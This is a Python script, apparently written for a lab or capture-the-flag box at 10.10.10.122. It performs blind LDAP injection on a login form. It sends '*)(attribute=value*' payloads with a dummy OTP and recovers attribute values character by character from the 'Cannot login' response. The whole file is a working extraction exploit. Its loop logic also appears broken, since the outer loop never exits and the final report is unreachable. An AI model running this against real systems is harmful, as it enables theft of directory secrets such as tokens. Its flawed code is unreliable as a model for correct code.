#!/usr/bin/python

import sys
import re
import requests
import urllib
import time

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

def main(): 
  with open("token.txt") as f:
    attributes = f.read().splitlines()
  for attribute in attributes:
    value= ""
    while True:
      for c in chars:
        cond = False
        payload = "*)({}={}".format(attribute, value+c + "*")
        data = {
         "inputUsername": urllib.quote(payload),
         "inputOTP": "000000",
        }
        time.sleep(0.3)  
        a = requests.post("http://10.10.10.122/login.php", data=data)
        b = re.search(r'<form action="/login.php" method="post" >\s+<div class="form-group row">\s+<div class="col-sm-10">\s+(.*)</div>', a.text)
        if "Cannot login" in (b.group(1)):
          value=value+c
          cond=True
          break
      print(value)
    if not cond:
      print("LDAP attribute {} = {}".format(attribute, value))
      value= ""
      break

if __name__== "__main__":
 main()

